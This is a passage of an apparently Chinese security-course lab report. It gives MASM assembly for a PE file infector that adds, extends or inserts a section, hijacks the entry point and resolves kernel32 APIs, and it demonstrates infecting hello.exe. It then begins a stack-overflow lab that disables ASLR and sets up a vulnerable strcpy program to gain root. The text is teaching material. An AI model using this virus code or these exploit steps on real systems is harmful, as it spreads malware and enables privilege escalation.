invoke	CreateFile,addr @szNewFile,GENERIC_READ or GENERIC_WRITE,FILE_SHARE_READ or \
	FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL
.if	eax &#x3D;&#x3D;	INVALID_HANDLE_VALUE
	invoke	MessageBox,0,addr szErrCreate,NULL,MB_OK
	jmp	_Ret
.endif
mov	@hFile,eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>第二步是获得新加入节表的地址：</p>
<p>首先将 <code>esi</code> 赋值为前面文件内存映射之后文件 <code>NT</code> 头的地址，并将所有头+节表描述项全部拷贝到堆中，将 <code>edi</code> 赋值为 <code>PE</code> 文件头(加节表)在堆中分配的首地址，并与 <code>esi</code> 相加，<code>ebx</code> 为增加的一个 <code>IMAGE_SETION_HEADER</code> 结构的地址：</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">mov	esi,_lpPeHead                                                                         ;esi为前面文件内存映射之后文件NT头的地址
assume	esi:ptr IMAGE_NT_HEADERS,edi:ptr IMAGE_NT_HEADERS
invoke	GlobalAlloc,GPTR,[esi].OptionalHeader.SizeOfHeaders
mov	edi,eax
invoke	RtlMoveMemory,edi,_lpFile,[esi].OptionalHeader.SizeOfHeaders                           ;所有头+节表描述项全部拷贝到堆中
mov	@lpMemory,eax                                                                          ;eax为PE文件头(加节表)在堆中分配的首地址
mov	edi,eax
add	edi,esi
sub	edi,_lpFile                                                                 ;此时edi应该为堆中的PE文件的NT头地址
movzx	eax,[esi].FileHeader.NumberOfSections                                       ;PE文件的Section的个数
dec	eax
mov	ecx,sizeof IMAGE_SECTION_HEADER
mul	ecx

mov	edx,edi
add	edx,eax                                                                     
add	edx,sizeof IMAGE_NT_HEADERS                                                 ;edx为最后一个IMAGE_SECTION_HEADER的地址
mov	ebx,edx
add	ebx,sizeof IMAGE_SECTION_HEADER                                             ;ebx为增加的一个IMAGE_SETION_HEADER结构的地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>第三步是加入节，并修正一些PE头部的内容：</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">inc	[edi].FileHeader.NumberOfSections                                           ;节个数加1
mov	eax,[edx].PointerToRawData                                                  ;最后节基于文件的偏移量--&gt;eax
add	eax,[edx].SizeOfRawData                                                     ;最后节占用长度+eax--&gt;eax，为新节的文件偏移
            	mov    fTemp0,eax
mov	[ebx].PointerToRawData,eax                                                  ;得到新节的文件偏移
              ;计算新节文件对齐后长度
invoke	_Align,offset APPEND_CODE_END-offset APPEND_CODE,[esi].OptionalHeader.FileAlignment
mov	[ebx].SizeOfRawData,eax      ;对齐文件长度
              ;计算新节内存对齐后长度
invoke	_Align,offset APPEND_CODE_END-offset APPEND_CODE,[esi].OptionalHeader.SectionAlignment
add	[edi].OptionalHeader.SizeOfCode,eax	                                     ;修正代码段大小SizeOfCode
add	[edi].OptionalHeader.SizeOfImage,eax	                                     ;修正内存中整个PE映像体的尺寸SizeOfImage
              ;计算
invoke	_Align,[edx].Misc.VirtualSize,[esi].OptionalHeader.SectionAlignment          ;最后一个节经过对齐之后的长度
add	eax,[edx].VirtualAddress                                                     ;最后一个节的RVA加上该节内存对齐之后的长度
mov	[ebx].VirtualAddress,eax                                                     ;得到新节的内存偏移
mov	[ebx].Misc.VirtualSize,offset APPEND_CODE_END-offset APPEND_CODE
mov	[ebx].Characteristics,IMAGE_SCN_CNT_CODE\                                    ;设置新节的属性为“代码”+“可执行”+“可读”+“可写”
	or IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE
invoke	lstrcpy,addr [ebx].Name1,addr szMySection<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后修正文件入口指针，分别需要保存老的入口地址和设置新的入口地址：</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">mov    eax, [edi].OptionalHeader.AddressOfEntryPoint
mov    @dwEntry, eax                                                                 ;保存老的入口地址
mov	eax,[ebx].VirtualAddress
add	eax,(offset _NewEntry-offset APPEND_CODE)
mov	[edi].OptionalHeader.AddressOfEntryPoint,eax                                 ;设置新的入口地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后写入文件：</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">            ;写文件头和原程序内容
invoke	WriteFile,@hFile,@lpMemory,[esi].OptionalHeader.SizeOfHeaders,\
	addr @dwTemp,NULL
invoke	SetFilePointer,@hFile,[ebx].PointerToRawData,NULL,FILE_BEGIN
            ;写新代码
invoke	WriteFile,@hFile,offset APPEND_CODE,[ebx].Misc.VirtualSize,\
	addr @dwTemp,NULL
mov	eax,[ebx].PointerToRawData
add	eax,[ebx].SizeOfRawData
invoke	SetFilePointer,@hFile,eax,NULL,FILE_BEGIN
invoke	SetEndOfFile,@hFile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其次，修正新加代码中的 <code>Jmp oldEntry</code> 指令：</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">mov	eax,[ebx].VirtualAddress
add	eax,(offset _ToOldEntry-offset APPEND_CODE+5); jmp xxxxxxxx的下条指令偏移地址，大小为5字节，所以加5
sub	@dwEntry,eax
mov	ecx,[ebx].PointerToRawData
add	ecx,(offset _dwOldEntry-offset APPEND_CODE)

invoke	SetFilePointer,@hFile,ecx,NULL,FILE_BEGIN
invoke	WriteFile,@hFile,addr @dwEntry,4,addr @dwTemp,NULL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最后关闭文件即可：</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">		invoke	GlobalFree,@lpMemory
		invoke	CloseHandle,@hFile
_Ret:
		assume	esi:nothing
              	invoke	lstrcpy ,f_Name ,addr @szNewFile
		popad<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="3-2-节扩展"><a href="#3-2-节扩展" class="headerlink" title="3.2 节扩展"></a>3.2 节扩展</h3><p>节扩展中需要进行以下操作：</p>
<p>修改最后一个节表的属性，文件对齐后的大小，并修改文件入口点、修正跳转到原入口点指令。具体来看，与第一种方式的区别主要在于需要定位到最后一个节表的地址，并进行节扩展：</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">mov	esi,_lpPeHead                                                                         ;esi为前面文件内存映射之后文件NT头的地址
assume	esi:ptr IMAGE_NT_HEADERS,edi:ptr IMAGE_NT_HEADERS
invoke	GlobalAlloc,GPTR,[esi].OptionalHeader.SizeOfHeaders
mov	edi,eax                                                                                ;edi指向了堆中的首地址
invoke	RtlMoveMemory,edi,_lpFile,[esi].OptionalHeader.SizeOfHeaders                           ;所有头+节表描述项全部拷贝到堆中
mov	@lpMemory,eax                                                                          ;eax为PE文件头(加节表)在堆中分配的首地址
add	edi,esi
sub	edi,_lpFile                                                                            ;此时edi应该为堆中的PE文件的NT头地址
movzx	eax,[esi].FileHeader.NumberOfSections                                                  ;PE文件的Section的个数
dec	eax
mov	ecx,sizeof IMAGE_SECTION_HEADER
mul	ecx

mov	ebx,edi
add	ebx,eax                                                                     
add	ebx,sizeof IMAGE_NT_HEADERS                                                 ;edx为最后一个IMAGE_SECTION_HEADER的地址
assume	ebx:ptr IMAGE_SECTION_HEADER <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="3-3-节插入"><a href="#3-3-节插入" class="headerlink" title="3.3 节插入"></a>3.3 节插入</h3><p>节插入中需要进行以下操作：</p>
<p>循环遍历各区表结构，判断空闲区间是否大于插入代码的大小。判断该节是否已经插入了代码。修正区段实际代码长度、文件对齐之后的长度、节表的属性。</p>
<p>定位到可以插入的节代码设计如下：</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">;定位到可以插入的节
; esi --&gt; 原PeHead，edi --&gt; 新的PeHead
; ebx --&gt; 插入的节表
;*******************************************************************
		mov	esi,_lpPeHead                                                                          ;esi为前面文件内存映射之后文件NT头的地址
		assume	esi:ptr IMAGE_NT_HEADERS,edi:ptr IMAGE_NT_HEADERS
		invoke	GlobalAlloc,GPTR,[esi].OptionalHeader.SizeOfHeaders
		mov	edi,eax
		invoke	RtlMoveMemory,edi,_lpFile,[esi].OptionalHeader.SizeOfHeaders                           ;所有头+节表描述项全部拷贝到堆中		
		mov	@lpMemory,eax                                                                          
		add	edi,esi
		sub	edi,_lpFile                                                                            ;edi为堆中拷贝的NT头首地址
		mov	cx,[esi].FileHeader.NumberOfSections                                                   ;节表的个数
		dec	ecx
		mov	@secNum,ecx
		xor	ecx,ecx
		mov	ebx,sizeof IMAGE_NT_HEADERS
		add	ebx,edi                                                                                ;ebx指向堆中的第一个IMAGE_SECTION_HEADER结构
		assume	ebx:ptr IMAGE_SECTION_HEADER
		
		.while	ecx &lt;&#x3D; @secNum
			mov	eax,sizeof IMAGE_SECTION_HEADER
			mul	cx
			add	ebx,eax                                                                       ;ebx定位到第ecx+1个IMAGE_SECTION_HEADER结构的地址
			mov	eax,[ebx].SizeOfRawData                                                       ;节在文件中对齐后的长度
			sub	eax,[ebx].Misc.VirtualSize                                                    ;减去节的实际长度之后得到的是节的空白区大小
			mov	edx,offset APPEND_CODE_END - offset APPEND_CODE                               ;病毒大小
			.if	eax &gt;&#x3D; edx
				jmp Ok_insert
			.endif
			inc ecx
		.endw
;******************************************************************
;如果没有符合条件的节表,则退出。
;******************************************************************
		invoke MessageBox,NULL,addr tell_3,addr sorry,MB_OK
		jmp _Ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其次，应该修正 <code>PE</code> 头部的内容，并修正文件入口指针：</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">;修正一些PE头部的内容
;****************************************************************** 
	Ok_insert:
		invoke SetFilePointer,@hFile,0,NULL,FILE_BEGIN
		mov	ecx,[ebx].Misc.VirtualSize                                                  ;如果这个节已经被感染了
		add	ecx,[ebx].PointerToRawData
		sub	ecx,4
		invoke 	SetFilePointer,@hFile,ecx,NULL,FILE_BEGIN
		invoke 	ReadFile,@hFile,addr @flags,4,addr @dwTemp,NULL
		mov 	eax,@flags
		.if	eax &#x3D;&#x3D; 11111111h
			invoke MessageBox,NULL,addr tell_2,addr sorry,MB_OK
			jmp _Ret
		.endif
		
		mov	eax,offset APPEND_CODE_END - offset APPEND_CODE
		add	eax,[ebx].Misc.VirtualSize
		mov	[ebx].Misc.VirtualSize,eax                                                            ;修正节区代码的实际长度
		invoke	_Align,[ebx].Misc.VirtualSize,[esi].OptionalHeader.FileAlignment                  
		mov	[ebx].SizeOfRawData,eax                                                               ;修正节在文件对齐之后的长度
		mov	[ebx].Characteristics,IMAGE_SCN_CNT_CODE\                                    ;设置新节的属性为“代码”+“可执行”+“可读”+“可写”
			or IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE
;*****************************************************************
;修正文件入口指针
;*****************************************************************
		mov	eax,[esi].OptionalHeader.AddressOfEntryPoint
		mov	@dwEntry,eax
		mov	eax,[ebx].VirtualAddress
		add	eax,[ebx].Misc.VirtualSize
		sub	eax,offset APPEND_CODE_END - offset _NewEntry
		mov	[edi].OptionalHeader.AddressOfEntryPoint,eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="3-4-获取-API-函数与-Kernel32-dll-的地址"><a href="#3-4-获取-API-函数与-Kernel32-dll-的地址" class="headerlink" title="3.4 获取 API 函数与 Kernel32.dll 的地址"></a>3.4 获取 <code>API</code> 函数与 <code>Kernel32.dll</code> 的地址</h3><p><code>Win32</code> 下的系统功能调用一般通过调用动态连接库中的 <code>API</code> 函数实现。病毒获取 <code>API</code> 函数地址主要采用以下两种方法：</p>
<ul>
<li>静态方式：调用时，根据函数名查引入表，就可以获取该函数的地址。</li>
<li>动态方式：使用函数 <code>LoadLibrary</code> 装载需要调用的函数所在的dll文件，获取模块句柄。然后调用<code>GetProcAddress</code> 获取需要调用的函数地址。这种方式是在需要调用函数时才将函数所在的模块调入到内存中，同时也不需要编译器为函数在引入表中建立相应的项。</li>
</ul>
<p><code>LoadLibrary</code> 和 <code>GetProcAddress</code> 函数是系统模块 <code>kernel32.dll</code> 提供的，所以他们必定在 <code>kernel32</code> 的引出表中被导出。只要我们能得到 <code>kernel32</code> 的地址，我们就可以通过搜索 <code>kernel32</code> 的引出表，搜索得到它们的地址。</p>
<p>得到模块 <code>kernel32</code> 的地址的方法如下：由于程序入口点是被 <code>kernel32</code> 某个函数调用的，所以这个调用函数肯定在 <code>kernel32</code> 的地址空间上。那么我们只要取得这个返回地址，就得到了一个 <code>kernel32</code> 空间中的一个地址。</p>
<p><code>Kernel32.dll</code> 的加载基地址按照 <code>0x1000</code> 对齐，通过这个地址，我们可以从高地址向低地址方向进行搜索，通过PE标志的判断，搜索到 <code>kernel32</code> 模块的基地址。具体实现流程如下：</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">GetKernelBase proc _dwKernelRet:DWORD
    LOCAL @dwReturn:DWORD
     
    pushad
    mov @dwReturn,0
     
;******************************************************
;查找Kernel32.dll的基地址
;******************************************************
    mov edi,_dwKernelRet
    and edi,0ffff0000h
    .while TRUE
        .if word ptr [edi] &#x3D;&#x3D; IMAGE_DOS_SIGNATURE
            mov esi,edi
            add esi,[esi+003ch]                       ;e_lfanew字段的偏移为3c
            .if word ptr [esi] &#x3D;&#x3D; IMAGE_NT_SIGNATURE
                mov @dwReturn,edi
                .break
            .endif
        .endif
        _PageError:
        sub edi,01000h
        .break .if edi &lt; 07000000h
    .endw
    popad
    mov eax,@dwReturn
    ret
 
_GetKernelBase endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>查找 <code>API</code> 地址的具体实现流程如下：</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">GetApi proc _hModule:DWORD,_lpszApi:DWORD
     
    local @dwReturn:DWORD
    LOCAL @dwStringLength:DWORD                                 ;需要查找地址的API函数的长度
     
    pushad
    mov @dwReturn,0
;****************************************************
;重定位
;****************************************************
    Call @F
    @@:
    pop ebx
    sub ebx,offset @B
     
;****************************************************
;计算API字符串的长度(包含&#39;\0&#39;)
;****************************************************
    mov edi,_lpszApi
    mov ecx,-1
    xor al,al
    cld                                         ;设置方向标志DF&#x3D;0,地址递增
    repnz scasb
    mov ecx,edi
    sub ecx,_lpszApi
    mov @dwStringLength,ecx
     
;****************************************************
;导出表
;****************************************************
    mov esi,_hModule
    assume esi:ptr IMAGE_DOS_HEADER
    add esi,[esi].e_lfanew
    assume esi:ptr IMAGE_NT_HEADERS
    mov esi,[esi].OptionalHeader.DataDirectory.VirtualAddress
    add esi,_hModule
    assume esi:ptr IMAGE_EXPORT_DIRECTORY
     
;****************************************************
;寻找符合名称的导出函数名
;****************************************************
    mov ebx,[esi].AddressOfNames
    add ebx,_hModule
    xor edx,edx
    .repeat
        push esi
        mov edi,[ebx]                                    ;获取一个指向导出函数的API函数名称的RVA
        add edi,_hModule                                 ;加上基地址
        mov esi,_lpszApi                                 ;esi指向需要查找的API函数名称
        mov ecx,@dwStringLength                          ;需要寻找的API函数的名称长度
        repz cmpsb                                       ;导出API函数名与需要查找的函数名进行逐位比较
        .if ZERO?
            pop esi                                  ;如果匹配
            jmp @F
        .endif
        pop esi
        add ebx,4                                        ;指向下一个API函数名的RVA
        inc edx                                          ;计数加一
    .until edx &gt;&#x3D; [esi].NumberOfNames                        ;如果所有的函数名已经都进行过匹配，则说明需要查找的函数不在Kernel32.dll里面
    jmp _Error
@@:                                       ;ebx指向了导出表中需要查找的函数名的地址
;**********************************************************
;API名称索引 --&gt; 序号索引 --&gt;地址索引
;**********************************************************
    sub ebx,_hModule                      ;减去Kernel32基地址
    sub ebx,[esi].AddressOfNames          ;减去AddressOfNames字段的RVA，得到的值为API名称索引*4(DWORD)
    shr ebx,1                             ;除以2(AddressOfNameOrdinals的序号为WORD)
    add ebx,[esi].AddressOfNameOrdinals   ;加上AddressOfNameOrdinals字段的RVA
    add ebx,_hModule                      ;加上Kernel32基地址
    movzx eax, word ptr [ebx]             ;得到该API的序号
    shl eax,2                             ;乘以4(地址为DWORD型)
    add eax,[esi].AddressOfFunctions      ;加上AddressOfFunctions字段的RVA
    add eax,_hModule                      ;加上Kernel32的基地址，此时eax指向的就是需要查找的函数名的地址
    mov eax,[eax]
    add eax,_hModule
    mov @dwReturn,eax
_Error:
    assume esi:nothing
    popad
    mov eax,@dwReturn
    ret
 
_GetApi endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="3-5-实验演示"><a href="#3-5-实验演示" class="headerlink" title="3.5 实验演示"></a>3.5 实验演示</h3><p>在未感染病毒的情况下，<code>hello.exe</code> 执行结果如下：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107154056706.png" alt="image-20230107154056706"></p>
<p>输入相应密码并开始感染，发现可以感染 <code>hello.exe</code>，并执行感染操作：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107003100440.png" alt="image-20230107003100440"></p>
<p>感染后打开<code>hello.exe</code>，执行结果如下：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107001905714.png" alt="image-20230107001905714"></p>
<p>我们使用区段查看器分别对感染前和三种方式感染后的 <code>PE</code> 文件区段进行对比：</p>
<p>感染前的 <code>PE</code> 文件区段：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107154515191.png" alt="image-20230107154515191"></p>
<p>节添加方式感染的 <code>PE</code> 文件区段：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107154722270.png" alt="image-20230107154722270"></p>
<p>节扩展方式感染的 <code>PE</code> 文件区段：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107154749268.png" alt="image-20230107154749268"></p>
<p>节插入方式感染的 <code>PE</code> 文件区段：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107154757510.png" alt="image-20230107154757510"></p>
<h1 id="实验三-缓冲区溢出实验"><a href="#实验三-缓冲区溢出实验" class="headerlink" title="实验三 缓冲区溢出实验"></a>实验三 缓冲区溢出实验</h1><h2 id="一、实验要求-2"><a href="#一、实验要求-2" class="headerlink" title="一、实验要求"></a>一、实验要求</h2><p>调试课堂介绍的有关栈溢出、堆溢出实例、<code>BSS</code>溢出和格式化字符串溢出实例，围绕着这些实例采用的溢出方法，自行调整溢出使用的字符串，摸索并掌握控制程序流程的字符串设计方法，并分析其特征和规律。注意事项如下：</p>
<p>1) 栈溢出需要重点体验函数调用与返回过程中栈帧的结构与变化，以及返回函数地址（<code>EIP</code>）的控制方法</p>
<p>2) 堆溢出需要关注堆的大小、堆的反复创建与释放可能造成的碎片、连续创建堆之间的间隙</p>
<p>3) 格式化字符串需要关注各种格式化字符串结合自行设置的变量造成溢出的规律</p>
<p>4) <code>BSS</code>溢出对于指针函数的获取方法，可以自行设计一个PE文件</p>
<p>要求自行构建缓冲区溢出场景（漏洞利用和攻击字符串构型，比如说<code>RNS</code>、<code>NSR</code>等），利用线程注入的方法，通过缓冲区溢出实现权限提升的攻击代码。</p>
<h2 id="二、实验原理-2"><a href="#二、实验原理-2" class="headerlink" title="二、实验原理"></a>二、实验原理</h2><p>缓冲区溢出的方法主要包括栈溢出、堆溢出、<code>BSS</code> 溢出、格式化串溢出等。</p>
<h3 id="2-1-栈溢出"><a href="#2-1-栈溢出" class="headerlink" title="2.1 栈溢出"></a>2.1 栈溢出</h3><p>栈（Stack）是一种用来存储函数调用时的临时信息的结构，如函数调用所传递的参数、函数的返回地址、函数的局部变量等。在实际应用中，堆栈会用于<strong>存储临时变量</strong>、<strong>函数调用</strong>、中断切换时<strong>保存和恢复现场数据</strong>。</p>
<p>如果在堆栈中压入的数据超过预先给堆栈分配的容量时，就会出现堆栈溢出，从而使得程序运行失败；如果发生溢出的是大型程序还有可能会导致系统崩溃。 </p>
<h3 id="2-2-堆溢出"><a href="#2-2-堆溢出" class="headerlink" title="2.2 堆溢出"></a>2.2 堆溢出</h3><p>当我们需要较大的缓冲区或在写代码时不知道包含在缓冲区中对象的大小，常常要使用堆。 </p>
<p>堆溢出的工作方式几乎与栈溢出的工作方式完全相同，唯一不同的是，堆没有压栈和入栈操作，而是分配和回收内存。<code>C</code> 语言中使用 <code>malloc()</code> 和 <code>free()</code> 函数实现内存的动态分配和回收，<code>C++</code> 语言使用 <code>new()</code> 和 <code>delete()</code> 函数来实现相同的功能。 </p>
<p>堆管理系统的三类操作分别是堆块分配、堆块释放和堆块合并，归根结底都是对链表的修改。</p>
<p><code>Overflow Freed Chunk</code>可以理解为常规的堆溢出，即程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数），因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块<br>不难发现，堆溢出漏洞发生的基本前提：</p>
<ul>
<li>程序向堆上写入数据</li>
<li>写入的数据大小没有被良好地控制</li>
</ul>
<h3 id="2-3-BSS-溢出"><a href="#2-3-BSS-溢出" class="headerlink" title="2.3 BSS 溢出"></a>2.3 <code>BSS</code> 溢出</h3><p><code>BSS</code>段指用来存放程序中<strong>未初始化的全局变量</strong>的一块内存区域，其分配比较简单，变量与变量之间是连续存放的，没有保留空间。</p>
<p>下面定义的两个字符数组即是位于 <code>BSS</code> 段：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">char</span> buf1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果事先向 <code>buf2</code> 中写入16个字符 <code>A</code>，之后再往 <code>buf1</code> 中写入24个字符 <code>B</code>，由于变量之间是连续存放的，静态字符数组<code>buf1</code> 溢出后，就会覆盖其相邻区域字符数组 <code>buf2</code> 的值。利用这一点，攻击者可以通过改写 <code>BSS</code> 中的指针或函数指针等方式，改变程序原先的执行流程，使指针跳转到特定的内存地址并执行指定操作。 </p>
<h3 id="2-4-格式化串溢出"><a href="#2-4-格式化串溢出" class="headerlink" title="2.4 格式化串溢出"></a>2.4 格式化串溢出</h3><p>格式化串溢出源自 <code>*printf()</code> 类函数的参数格式问题（如 <code>printf</code> 、<code>fprintf</code>、<code>sprintf</code> 等）。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>format<span class="token punctuation">,</span> arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">,</span> …<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>它们将根据 <code>format</code> 的内容（<code>%s</code>，<code>%d</code>，<code>%p</code>，<code>%x</code>，<code>%n</code>，…），将数据格式化后输出。</p>
<p>问题在于 <code>printf()</code> 函数并不能确定数据参数 <code>arg1</code>，<code>arg2</code>，…究竟在什么地方结束，即函数本身不关心参数的个数；当 <code>printf</code> 在输出格式化字符串的时候，会维护一个内部指针，当 <code>printf</code> 逐步将格式化字符串的字符打印到屏幕，当遇到 <code>%</code> 的时候，<code>printf</code> 会期望它后面跟着一个格式字符串，因此会递增内部字符串以抓取格式控制符的输入值。</p>
<p>这就是问题所在，<code>printf</code>无法知道栈上是否放置了正确数量的变量供它操作，如果没有足够的变量可供操作，而指针按正常情况下递增，就会产生越界访问；甚至由于 <code>%n</code> 的问题，可导致任意地址读写。</p>
<p>格式化串溢出的示意图如下所示：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107230524528.png" alt="image-20230107230524528"></p>
<h2 id="三、实验具体步骤-2"><a href="#三、实验具体步骤-2" class="headerlink" title="三、实验具体步骤"></a>三、实验具体步骤</h2><h3 id="3-1-栈溢出"><a href="#3-1-栈溢出" class="headerlink" title="3.1 栈溢出"></a>3.1 栈溢出</h3><p>在本实验中，我们将分析缓冲区溢出漏洞存在的原因，并模拟进行缓冲区溢出漏洞攻击，最后将设计缓冲区溢出漏洞分析的工具。</p>
<p>缓冲区溢出可能导致程序崩溃或者执行其他代码。从攻击者的角度来看，后者更加有利可图。当攻击者能够让一个目标程序运行他们的代码时，他们就能劫持该程序的执行流程。如果该程序以某种特权运行，那就意味着攻击者将获得额外的权限。</p>
<p>在本次实验中，通过缓冲区溢出攻击拿到系统的 <code>root</code> 权限的根本方法就是向缓冲区中注入我们要拿到 <code>root</code> 权限的恶意代码，这个过程中我们通过不同的方法达到我们的目的，如构造有漏洞的程序注入恶意代码、对缓冲区采取爆破寻找地址、构造 <code>shellcode</code> 等。 </p>
<p>在缓冲区溢出漏洞分析工具的设计环节，我们通过自动添加语句的脚本，在给定的源程序中添加能够检测源程序各函数是否具有缓冲区溢出漏洞的代码。</p>
<p>栈溢出部分的实验流程图如下所示：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107155646862.png" alt="image-20230107155646862"></p>
<h4 id="3-1-1-构造具有栈溢出漏洞的程序"><a href="#3-1-1-构造具有栈溢出漏洞的程序" class="headerlink" title="3.1.1 构造具有栈溢出漏洞的程序"></a>3.1.1 构造具有栈溢出漏洞的程序</h4><p>在 32位 <code>Ubuntu16.04</code> 虚拟机中搭建攻击环境。由于缓冲区溢出问题由来已久，多数操作系统已经采取了一些防御措施。为简化实验，先关闭这些防御措施，完成攻击后再将它们逐个打开，研究它们的防御原理。</p>
<p>首先我们关闭地址随机化，即关闭针对缓冲区溢出攻击的防御措施，命令为 <code>sudo sysctl -w kernel.randomize_va_space=0</code>；</p>
<p>然后使用 <code>stack.c</code> 代码作为目标程序，代码如下：</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
 
<span class="token keyword">int</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token comment">/* The following statement has a buffer overflow problem */</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// ➀</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
